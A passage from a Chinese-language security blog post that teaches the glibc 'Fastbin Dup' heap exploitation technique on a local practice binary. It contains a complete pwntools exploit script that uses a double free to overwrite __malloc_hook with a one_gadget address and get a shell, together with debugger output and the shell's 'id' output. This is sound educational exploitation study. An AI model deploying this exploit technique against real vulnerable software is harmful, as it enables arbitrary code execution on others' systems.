class="number">3597</span> 	      <span class="comment">/* While we&#x27;re here, if we see other chunks of the same size,</span></span><br><span class="line"><span class="comment">   3598 		 stash them in the tcache.  */</span></span><br><span class="line">   <span class="number">3599</span> 	      size_t tc_idx = csize2tidx (nb);</span><br><span class="line">────────────────────────────────────────────────────────────────────────────────</span><br></pre></td></tr></table></figure>

<p>根据backtrace看到是在_int_malloc 的时候出问题的，根据代码来看，3592 行是在获取当前chunk的size然后判断是在fastbins中的第几个bin， 3593行则是判断当前的使用的bin和size所在的bin是否为同一个，如果不是则提示错误。 </p>
<p>如此看来，错误应该是user这个fake bin 中表示size的字段不在0x60—0x70之间，根据上面看的user结构：两个长度为16的char数组，我们可以自己控制user.username [8:15]，将其设置成0x70bin的长度即可:</p>
<figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">io.sendafter(<span class="string">&quot;username: &quot;</span>, p64(<span class="number">0</span>) + p64(<span class="number">0x71</span>))</span><br><span class="line">io.recvuntil(<span class="string">&quot;&gt; &quot;</span>)</span><br><span class="line"></span><br><span class="line">chunk_A = malloc(<span class="number">0x68</span>, <span class="string">&quot;A&quot;</span>*<span class="number">0x68</span>)</span><br><span class="line">chunk_B = malloc(<span class="number">0x68</span>, <span class="string">&quot;B&quot;</span>*<span class="number">0x68</span>)</span><br><span class="line">input(<span class="string">&quot;after malloc&quot;</span>)</span><br><span class="line">free(chunk_A)</span><br><span class="line">free(chunk_B)</span><br><span class="line">input(<span class="string">&quot;after free normal&quot;</span>)</span><br><span class="line"></span><br><span class="line">free(chunk_A)</span><br><span class="line">input (<span class="string">&quot;after double free&quot;</span>)</span><br><span class="line">dup=malloc(<span class="number">0x68</span>, p64(elf.sym.user))</span><br><span class="line">input(<span class="string">&quot;malloc for user addr&quot;</span>)</span><br><span class="line">malloc(<span class="number">0x68</span>,<span class="string">&quot;C&quot;</span>*<span class="number">0x68</span>)</span><br><span class="line">malloc(<span class="number">0x68</span>,<span class="string">&quot;D&quot;</span>*<span class="number">0x68</span>)</span><br><span class="line">malloc(<span class="number">0x68</span>,<span class="string">&quot;arbitrary write&quot;</span>)</span><br><span class="line">---</span><br><span class="line">pwndbg&gt; p user</span><br><span class="line">$<span class="number">1</span> = &#123;</span><br><span class="line">  username = <span class="string">&quot;\000\000\000\000\000\000\000\000q\000\000\000\000\000\000&quot;</span>,</span><br><span class="line">  target = <span class="string">&quot;XXXXXXX\000\000\000\000\000\000\000\000&quot;</span></span><br><span class="line">&#125;</span><br><span class="line">pwndbg&gt; c</span><br><span class="line">Continuing.</span><br><span class="line">^C</span><br><span class="line">pwndbg&gt; p user</span><br><span class="line">$<span class="number">2</span> = &#123;</span><br><span class="line">  username = <span class="string">&quot;\000\000\000\000\000\000\000\000q\000\000\000\000\000\000&quot;</span>,</span><br><span class="line">  target = <span class="string">&quot;arbitrary write&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>至此一个任意地址写已经实现了，下面就看一下如何实现RCE， 常规思路是通过任意写修改GOT表中malloc 或free对应的地址，改成system项尔后再填入参数调用。这里记一种新学到的招式：</p>
<p>在glibc中，提供了_malloc_hook 以及_free_hook，在调用malloc或free时，如果对应的hook值存在，则会先调用_malloc_hook或_free_hook指向的地址。既然如此，我们便可以overwrite 对应的地址，这样就可以直接让glibc帮我们来调用。overwrite的内容可以通过one_gadget 寻找glibc中的execve(“/bin/sh”…)，只要满足条件就可以用。</p>
<p>下面详细来讲：</p>
<figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; ptype __malloc_hook</span><br><span class="line">type = <span class="keyword">void</span> *(*)(size_t, <span class="keyword">const</span> <span class="keyword">void</span> *)</span><br><span class="line">pwndbg&gt; ptype __free_hook</span><br><span class="line">type = <span class="keyword">void</span> (*)(<span class="keyword">void</span> *, <span class="keyword">const</span> <span class="keyword">void</span> *)</span><br><span class="line">pwndbg&gt; dq &amp;__malloc_hook <span class="number">20</span></span><br><span class="line">00007f6d768d3b50     <span class="number">0000000000000000</span> <span class="number">0000000000000000</span></span><br><span class="line">00007f6d768d3b60     <span class="number">0000000000000000</span> <span class="number">0000000000000000</span></span><br><span class="line">00007f6d768d3b70     <span class="number">0000000000000000</span> <span class="number">0000000000000000</span></span><br><span class="line">00007f6d768d3b80     <span class="number">0000000000000000</span> <span class="number">0000000000000000</span></span><br><span class="line">00007f6d768d3b90     <span class="number">0000000000000000</span> <span class="number">0000000000000000</span></span><br><span class="line">00007f6d768d3ba0     <span class="number">0000000000000000</span> <span class="number">0000000000000000</span></span><br><span class="line">00007f6d768d3bb0     <span class="number">0000000000000000</span> <span class="number">0000000000000000</span></span><br><span class="line">00007f6d768d3bc0     000000000259d0e0 <span class="number">0000000000000000</span></span><br><span class="line">00007f6d768d3bd0     00007f6d768d3bc0 00007f6d768d3bc0</span><br><span class="line">00007f6d768d3be0     00007f6d768d3bd0 00007f6d768d3bd0</span><br><span class="line">pwndbg&gt; dq &amp;__free_hook <span class="number">20</span></span><br><span class="line">00007f6d768d5e20     <span class="number">0000000000000000</span> <span class="number">0000000000000000</span></span><br><span class="line">00007f6d768d5e30     <span class="number">0000000000000000</span> <span class="number">0000000000000000</span></span><br><span class="line">00007f6d768d5e40     <span class="number">0000000000000000</span> <span class="number">0000000000000000</span></span><br><span class="line">00007f6d768d5e50     <span class="number">0000000000000000</span> <span class="number">0000000000000000</span></span><br><span class="line">00007f6d768d5e60     <span class="number">0000000000000000</span> <span class="number">0000000000000000</span></span><br><span class="line">00007f6d768d5e70     <span class="number">0000000000000000</span> <span class="number">0000000000000080</span></span><br><span class="line">00007f6d768d5e80     <span class="number">0000000000000000</span> <span class="number">0000000000000000</span></span><br><span class="line">00007f6d768d5e90     <span class="number">0000000000000000</span> <span class="number">0000000000000000</span></span><br><span class="line">00007f6d768d5ea0     <span class="number">0000000000000000</span> <span class="number">0000000000000000</span></span><br><span class="line">00007f6d768d5eb0     <span class="number">0000000000000000</span> <span class="number">0000000000000000</span></span><br></pre></td></tr></table></figure>

<p>看了__malloc_hook 和__free_hook，发现一个问题，如果把他们当作一个fake chunk，表示size的字段都是0，必然无法通过_int_malloc中的check，同时这里也不像user结构那样可以被我们控制。既然如此，那我们就向前找找，只要表示size的字段合适且能覆盖到_malloc_hook 或_free_hook就可以。这里可以借助pwndbg的find_fake_fast命令：</p>
<figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; find_fake_fast --help</span><br><span class="line"><span class="attr">usage</span>: find_fake_fast [-h] addr [size]</span><br><span class="line"></span><br><span class="line">Find candidate fake fast chunks overlapping the specified address.</span><br><span class="line"></span><br><span class="line">positional <span class="built_in">arguments</span>:</span><br><span class="line">  addr        Address <span class="keyword">of</span> the word-sized value to overlap.</span><br><span class="line">  size        Size <span class="keyword">of</span> fake chunks to find.</span><br><span class="line"></span><br><span class="line">optional <span class="built_in">arguments</span>:</span><br><span class="line">  -h, --help  show <span class="built_in">this</span> help message and exit</span><br><span class="line">pwndbg&gt; find_fake_fast &amp;__malloc_hook </span><br><span class="line">FAKE CHUNKS</span><br><span class="line">Fake chunk | Allocated chunk | PREV_INUSE | IS_MMAPED | NON_MAIN_ARENA</span><br><span class="line"><span class="attr">Addr</span>: <span class="number">0x7f6d768d3b2d</span></span><br><span class="line"><span class="attr">prev_size</span>: <span class="number">0x6d768cfee0000000</span></span><br><span class="line"><span class="attr">size</span>: <span class="number">0x7f</span></span><br><span class="line"><span class="attr">fd</span>: <span class="number">0x6d765a2a10000000</span></span><br><span class="line"><span class="attr">bk</span>: <span class="number">0x6d765a2ed000007f</span></span><br><span class="line"><span class="attr">fd_nextsize</span>: <span class="number">0x7f</span></span><br><span class="line"><span class="attr">bk_nextsize</span>: <span class="number">0x00</span></span><br><span class="line"></span><br><span class="line">pwndbg&gt; find_fake_fast &amp;__free_hook</span><br><span class="line">FAKE CHUNKS</span><br><span class="line">pwndbg&gt; p &amp;__malloc_hook</span><br><span class="line">$<span class="number">1</span> = (<span class="keyword">void</span> *(**)(size_t, <span class="keyword">const</span> <span class="keyword">void</span> *)) <span class="number">0x7f6d768d3b50</span> &lt;__malloc_hook&gt;</span><br><span class="line">p/x <span class="number">0x7f6d768d3b50</span>-<span class="number">0x7f6d768d3b2d</span>-<span class="number">0x10</span> #malloc data字段在size之后</span><br><span class="line">$<span class="number">3</span> = <span class="number">0x13</span></span><br></pre></td></tr></table></figure>

<p>在__malloc_hook 前成功找到一个可以充当fake fast chunk 的地址而__free_hook前则没找到合适的。如此我们在找到的地址上填充p8(any_num)*0x13+p64(cmd)即可。下面通过one_gadget查找libc.so中的execve(“/bin/sh”…)</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">➜  ldd fastbin_dup </span><br><span class="line">        linux-vdso.so.1 (0x00007ffc21493000)</span><br><span class="line">        libc.so.6 =&gt; ../.glibc/glibc_2.30_no-tcache/libc.so.6 (0x00007ffa81a8000)</span><br><span class="line">        ../.glibc/glibc_2.30_no-tcache/ld.so.2 =&gt; /lib64/ld-linux-x86-64.so.2 (0x00007ffae8564000)</span><br><span class="line">➜  one_gadget ../.glibc/glibc_2.30_no-tcache/libc.so.6</span><br><span class="line">0xc4dbf execve(&quot;/bin/sh&quot;, r13, r12)</span><br><span class="line">constraints:</span><br><span class="line">  [r13] == NULL || r13 == NULL</span><br><span class="line">  [r12] == NULL || r12 == NULL</span><br><span class="line"></span><br><span class="line">0xe1fa1 execve(&quot;/bin/sh&quot;, rsp+0x50, environ)</span><br><span class="line">constraints:</span><br><span class="line">  [rsp+0x50] == NULL</span><br><span class="line"></span><br><span class="line">0xe1fad execve(&quot;/bin/sh&quot;, rsi, [rax])</span><br><span class="line">constraints:</span><br><span class="line">  [rsi] == NULL || rsi == NULL</span><br><span class="line">  [[rax]] == NULL || [rax] == NULL</span><br></pre></td></tr></table></figure>

<p>找到三个可以执行shell的，三个都有限制条件，对应constraints字段显示的内容。那就只能是一个一个试试看了，这里将对应的地址改成0xdeadbeef，这样在malloc走到这里时会直接跳到调试器中：</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA</span><br><span class="line">─────────────────────────────────[ REGISTERS ]──────────────────────────────────</span><br><span class="line"> RAX  0xdeadbeef</span><br><span class="line"> RBX  0x0</span><br><span class="line"> RCX  0x0</span><br><span class="line"> RDX  0xffffffffffffff98</span><br><span class="line"> RDI  0x68</span><br><span class="line"> RSI  0x400976 (main+431) ◂— mov    rdx, rax</span><br><span class="line"> R8   0x7fff71d631f3 ◂— 0x0</span><br><span class="line"> R9   0x0</span><br><span class="line"> R10  0x7fcc3ff00720 (_nl_C_LC_CTYPE_toupper+512) ◂— add    byte ptr [rax], al</span><br><span class="line"> R11  0xa</span><br><span class="line"> R12  0x4006e0 (_start) ◂— xor    ebp, ebp</span><br><span class="line"> R13  0x7fff71d63370 ◂— 0x1</span><br><span class="line"> R14  0x0</span><br><span class="line"> R15  0x0</span><br><span class="line"> RBP  0x7fff71d63290 —▸ 0x400ae0 (__libc_csu_init) ◂— push   r15</span><br><span class="line"> RSP  0x7fff71d63228 —▸ 0x400976 (main+431) ◂— mov    rdx, rax</span><br><span class="line"> RIP  0xdeadbeef</span><br><span class="line">───────────────────────────────────[ DISASM ]───────────────────────────────────</span><br><span class="line">Invalid address 0xdeadbeef</span><br><span class="line">───────────────────────────────────[ STACK ]────────────────────────────────────</span><br><span class="line">...</span><br><span class="line">─────────────────────────────────[ BACKTRACE ]──────────────────────────────────</span><br><span class="line"> ► f 0         deadbeef</span><br><span class="line">   f 1           400976 main+431</span><br><span class="line">   f 2     7fcc3fdbd037 __libc_start_main+231</span><br><span class="line">────────────────────────────────────────────────────────────────────────────────</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>可以看到r12 和 r13寄存器都不是空，且对应地址都不为空，所以第一个gadget不能满足条件。看下第二个，要求[rsp+0x50]为null，那就看下stack</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; stack 15</span><br><span class="line">00:0000│ rsp  0x7fff71d63228 —▸ 0x400976 (main+431) ◂— mov    rdx, rax</span><br><span class="line">01:0008│      0x7fff71d63230 —▸ 0x7fff71d63378 —▸ 0x7fff71d64302 ◂— &#x27;/home/x/fastbin_dup/fastbin_dup&#x27;</span><br><span class="line">02:0010│      0x7fff71d63238 ◂— 0x171d6326e</span><br><span class="line">03:0018│      0x7fff71d63240 ◂— 0x600000001</span><br><span class="line">04:0020│      0x7fff71d63248 ◂— 0x68 /* &#x27;h&#x27; */</span><br><span class="line">05:0028│      0x7fff71d63250 —▸ 0x23bc010 —▸ 0x7fcc4014fb41 (__memalign_hook+1) ◂— 0x4141414141414141 (&#x27;AAAAAAAA&#x27;)</span><br><span class="line">06:0030│      0x7fff71d63258 —▸ 0x23bc080 —▸ 0x23bc041 ◂— &#x27;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAq&#x27;</span><br><span class="line">07:0038│      0x7fff71d63260 —▸ 0x23bc010 —▸ 0x7fcc4014fb41 (__memalign_hook+1) ◂— 0x4141414141414141 (&#x27;AAAAAAAA&#x27;)</span><br><span class="line">08:0040│      0x7fff71d63268 —▸ 0x23bc080 —▸ 0x23bc041 ◂— &#x27;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAq&#x27;</span><br><span class="line">09:0048│      0x7fff71d63270 —▸ 0x23bc010 —▸ 0x7fcc4014fb41 (__memalign_hook+1) ◂— 0x4141414141414141 (&#x27;AAAAAAAA&#x27;)</span><br><span class="line">0a:0050│      0x7fff71d63278 —▸ 0x7fcc4014fb3d ◂— 0x4141414141414141 (&#x27;AAAAAAAA&#x27;)</span><br><span class="line">0b:0058│      0x7fff71d63280 ◂— 0x0</span><br><span class="line">0c:0060│      0x7fff71d63288 ◂— 0x755c2feb7db26d00</span><br><span class="line">0d:0068│ rbp  0x7fff71d63290 —▸ 0x400ae0 (__libc_csu_init) ◂— push   r15</span><br><span class="line">0e:0070│      0x7fff71d63298 —▸ 0x7fcc3fdbd037 (__libc_start_main+231) ◂— mov    edi, eax</span><br></pre></td></tr></table></figure>

<p>ok，可以看到虽然当前[rsp+0x50]不为空，但是 rsp+50 指向的是我们可以控制的字符，那么就可以手动将其设置成0，如此第二个就满足条件了，wink~</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"># =============================================================================</span><br><span class="line"></span><br><span class="line">io.sendafter(&quot;username: &quot;, p64(0) + p64(0x71))</span><br><span class="line"># io.sendafter(&quot;username: &quot;, &quot;FastbinDup&quot;)</span><br><span class="line">io.recvuntil(&quot;&gt; &quot;)</span><br><span class="line"></span><br><span class="line">chunk_A = malloc(0x68, &quot;A&quot;*0x68)</span><br><span class="line">chunk_B = malloc(0x68, &quot;B&quot;*0x68)</span><br><span class="line">input(&quot;after malloc&quot;)</span><br><span class="line"></span><br><span class="line">free(chunk_A)</span><br><span class="line">free(chunk_B)</span><br><span class="line">input(&quot;after free normal&quot;)</span><br><span class="line"></span><br><span class="line">free(chunk_A)</span><br><span class="line">input (&quot;after double free&quot;)</span><br><span class="line"># dup=malloc(0x68, p64(elf.sym.user))</span><br><span class="line">dup = malloc(0x68, p64(libc.sym.__malloc_hook-0x23))</span><br><span class="line"></span><br><span class="line">input(&quot;malloc for user addr&quot;)</span><br><span class="line">malloc(0x68,&quot;C&quot;*0x68)</span><br><span class="line">malloc(0x68,&quot;D&quot;*0x68)</span><br><span class="line"># malloc(0x68,&quot;arbitrary write&quot;)</span><br><span class="line"># malloc(0x68, p64(libc.sym.system))</span><br><span class="line">malloc(0x68, p8(0)*19+p64(libc.address + 0xe1fa1))</span><br><span class="line">malloc(0x68, &quot;&quot;)</span><br><span class="line">print (&quot;enjoy~&quot;)</span><br><span class="line"># =============================================================================</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">x@ubuntu  python3 RCE_Fastbin_Dup.py</span><br><span class="line">[*] <span class="string">&#x27;/home/x/fastbin_dup/fastbin_dup&#x27;</span></span><br><span class="line">    <span class="attr">Arch</span>:     amd64-<span class="number">64</span>-little</span><br><span class="line">    <span class="attr">RELRO</span>:    Full RELRO</span><br><span class="line">    <span class="attr">Stack</span>:    Canary found</span><br><span class="line">    <span class="attr">NX</span>:       NX enabled</span><br><span class="line">    <span class="attr">PIE</span>:      No PIE (<span class="number">0x400000</span>)</span><br><span class="line">    <span class="attr">RUNPATH</span>:  b<span class="string">&#x27;../.glibc/glibc_2.30_no-tcache&#x27;</span></span><br><span class="line">[*] <span class="string">&#x27;/home/x/.glibc/glibc_2.30_no-tcache/libc-2.30.so&#x27;</span></span><br><span class="line">    <span class="attr">Arch</span>:     amd64-<span class="number">64</span>-little</span><br><span class="line">    <span class="attr">RELRO</span>:    Partial RELRO</span><br><span class="line">    <span class="attr">Stack</span>:    Canary found</span><br><span class="line">    <span class="attr">NX</span>:       NX enabled</span><br><span class="line">    <span class="attr">PIE</span>:      PIE enabled</span><br><span class="line">[+] Starting local process <span class="string">&#x27;/home/x/fastbin_dup/fastbin_dup&#x27;</span>: pid <span class="number">13618</span></span><br><span class="line">after malloc</span><br><span class="line">after free normal</span><br><span class="line">after double free</span><br><span class="line">malloc <span class="keyword">for</span> user addr</span><br><span class="line">enjoy~</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">$ id</span><br><span class="line">uid=<span class="number">1000</span>(x) gid=<span class="number">1000</span>(x) groups=<span class="number">1000</span>(x),<span class="number">4</span>(adm),<span class="number">24</span>(cdrom),<span class="number">27</span>(sudo),<span class="number">30</span>(dip),<span class="number">46</span>(plugdev),<span class="number">120</span>(lpadmin),<span class="number">131</span>(lxd),<span class="number">132</span>(sambashare)</span><br></pre></td></tr></table></figure>

<h3 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h3><ol>
<li>Fastbin Dup 就是通过double free修改fd指针，将fake fast bin 链入当前的链表中，之后再分配到对应地址</li>
<li>fastbin 的double free 检查只检查当前链入的块是否是第一个，不是则ok</li>
<li>在分配fastbin出去时，会检查当前chunk中表示size的字段与当前bin所在的大小是否一致，不符合则报错，所以size字段需要符合条件</li>
<li>利用时__malloc_hook是一个很好的目标，通过find_fake_fast找到符合条件的地址，之后覆盖_malloc_hook为对应的地址即可，one_gadget 可以用于在glibc的so文件中查找”/bin/sh”</li>
</ol>
</div><div class="article-licensing box"><div class="licensing-title"><p>glibc 利用之Fastbin Dup</p><p><a href="https://avcatshy.github.io/2020/12/27/glibc利用之FastbinDup/">https://avcatshy.github.io/2020/12/27/glibc利用之FastbinDup/</a></p></div><div class="licensing-meta level is-mobile"><div class="level-left"><div class="level-item is-narrow"><div><h6>作者</h6><p>vlinkstone</p></div></div><div class="level-item is-narrow"><div><h6>发布于</h6><p>2020-12-27</p></div></div><div class="level-item is-narrow"><div><h6>更新于</h6><p>2020-12-27</p></div></div><div class="level-item is-narrow"><div><h6>许可协议</h6><p><a class="icons" rel="noopener" target="_blank" title="Creative Commons" href="https://creativecommons.org/"><i class="icon fab fa-creative-commons"></i></a><a class="icons" rel="noopener" target="_blank" title="Attribution" href="https://creativecommons.org/licenses/by/4.0/"><i class="icon fab fa-creative-commons-by"></i></a><a class="icons" rel="noopener" target="_blank" title="Noncommercial" href="https://creativecommons.org/licenses/by-nc/4.0/"><i class="icon fab fa-creative-commons-nc"></i></a></p></div></div></div></div></div><div class="article-tags is-size-7 mb-4"><span class="mr-2">#</span><a class="link-muted mr-2" rel="tag" href="/tags/Bin/">Bin</a></div><!--!--></article></div><!--!--><nav class="post-navigation mt-4 level is-mobile"><div class="level-start"><a class="article-nav-prev level level-item link-muted" href="/2020/12/27/%E5%B0%8F%E8%AE%B0%E4%B8%80%E5%88%99%E4%B8%8D%E4%B8%80%E6%A0%B7%E7%9A%84Fastbin%E5%88%A9%E7%94%A8/"><i class="level-item fas fa-chevron-left"></i><span class="level-item">小记一则不一样的Fastbin利用</span></a></div><div class="level-end"><a class="article-nav-next level level-item link-muted" href="/2020/02/02/about/"><span class="level-item">about</span><i class="level-item fas fa-chevron-right"></i></a></div></nav><div class="card"><div class="card-content"><h3 class="title is-5">评论</h3><div id="disqus_thread"><noscript>Please enable JavaScript to view the <a target="_blank" rel="noopener" href="//disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript></div><script>var disqus_config = function () {
            this.page.url = 'https://avcatshy.github.io/2020/12/27/glibc%E5%88%A9%E7%94%A8%E4%B9%8BFastbinDup/';
            this.page.identifier = '2020/12/27/glibc利用之FastbinDup/';
        };
        (function() {
            var d = document, s = d.createElement('script');  
            s.src = '//' + 'vlinkstone' + '.disqus.com/embed.js';
            s.setAttribute('data-timestamp', +new Date());
            (d.head || d.body).appendChild(s);
        })();</script></div></div></div><div class="column column-left is-4-tablet is-4-desktop is-3-widescreen  order-1"><div class="card widget" data-type="profile"><div class="card-content"><nav class="level"><div class="level-item has-text-centered flex-shrink-1"><div><figure class="image is-128x128 mx-auto mb-2"><img class="avatar" src="/img/avatar.png" alt="vlinkstone"></figure><p class="title is-size-4 is-block" style="line-height:inherit;">vlinkstone</p><p class="is-size-6 is-block">Security Noobs</p><p class="is-size-6 is-flex justify-content-center"><i class="fas fa-map-marker-alt mr-1"></i><span>CN</span></p></div></div></nav><nav class="level is-mobile"><div class="level-item has-text-centered is-marginless"><div><p class="heading">文章</p><a href="/archives"><p class="title">6</p></a></div></div><div class="level-item has-text-centered is-marginless"><div><p class="heading">分类</p><a href="/categories"><p class="title">3</p></a></div></div><div class="level-item has-text-centered is-marginless"><div><p class="heading">标签</p><a href="/tags"><p class="title">6</p></a></div></div></nav><div class="level"><a class="level-item button is-primary is-rounded" href="mailto:vlinkstone@gmail.com" target="_blank" rel="noopener">联系我</a></div><div class="level is-mobile is-multiline"><a class="level-item button is-transparent is-marginless" target="_blank" rel="noopener" title="Github" href="https://github.com/avcatshy"><i class="fab fa-github"></i></a><a class="level-item button is-transparent is-marginless" target="_blank" rel="noopener" title="Twitter" href="https://twitter.com/avcatshy"><i class="fab fa-twitter"></i></a></div></div></div><!--!--><div class="card widget" data-type="links"><div class="card-content"><div class="menu"><h3 class="menu-label">链接</h3><ul class="menu-list"><li><a class="level is-mobile" href="https://jdkhnjggf.github.io/" target="_blank" rel="noopener"><span class="level-left"><span class="level-item">Iuobobo</span></span><span class="level-right"><span class="level-item tag">jdkhnjggf.github.io</span></span></a></li><li><a class="level is-mobile" href="https://www.zuozuovera.com/" target="_blank" rel="noopener"><span class="level-left"><span class="level-item">薇拉航线🌺</span></span><span class="level-right"><span class="level-item tag">www.zuozuovera.com</span></span></a></li></ul></div></div></div><div class="card widget" data-type="categories"><div class="card-content"><div class="menu"><h3 class="menu-label">分类</h3><ul class="menu-list"><li><a class="level is-mobile" href="/categories/BIN/"><span class="level-start"><span class="level-item">BIN</span></span><span class="level-end"><span class="level-item tag">2</span></span></a></li><li><a class="level is-mobile" href="/categories/QEMU/"><span class="level-start"><span class="level-item">QEMU</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile" href="/categories/iOS/"><span class="level-start"><span class="level-item">iOS</span></span><span class="level-end"><span class="level-item tag">2</span></span></a></li></ul></div></div></div><div class="card widget" data-type="recent-posts"><div class="card-content"><h3 class="menu-label">最新文章</h3><article class="media"><div class="media-content"><p class="date"><time dateTime="2021-07-10T18:17:05.443Z">2021-07-10</time></p><p class="title"><a href="/2021/07/10/%E5%B0%8F%E8%AE%B0iOS%E5%8F%8D%E8%B0%83%E8%AF%95/">小记iOS反调试</a></p><p class="categories"><a href="/categories/iOS/">iOS</a></p></div></article><article class="media"><div class="media-content"><p class="date"><time dateTime="2021-07-03T15:43:18.545Z">2021-07-03</time></p><p class="title"><a href="/2021/07/03/Zoom-%E7%AE%80%E5%8D%95%E5%88%86%E6%9E%90/">Zoom 简单分析</a></p><p class="categories"><a href="/categories/iOS/">iOS</a></p></div></article><article class="media"><div class="media-content"><p class="date"><time dateTime="2021-07-03T13:37:55.110Z">2021-07-03</time></p><p class="title"><a href="/2021/07/03/cve-2019-6788-note/">cve-2019-6788 Note</a></p><p class="categories"><a href="/categories/QEMU/">QEMU</a></p></div></article><article class="media"><div class="media-content"><p class="date"><time dateTime="2020-12-28T06:20:17.825Z">2020-12-27</time></p><p class="title"><a href="/2020/12/27/%E5%B0%8F%E8%AE%B0%E4%B8%80%E5%88%99%E4%B8%8D%E4%B8%80%E6%A0%B7%E7%9A%84Fastbin%E5%88%A9%E7%94%A8/">小记一则不一样的Fastbin利用</a></p><p class="categories"><a href="/categories/BIN/">BIN</a></p></div></article><article class="media"><div class="media-content"><p class="date"><time dateTime="2020-12-28T06:20:07.377Z">2020-12-27</time></p><p class="title"><a href="/2020/12/27/glibc%E5%88%A9%E7%94%A8%E4%B9%8BFastbinDup/">glibc 利用之Fastbin Dup</a></p><p class="categories"><a 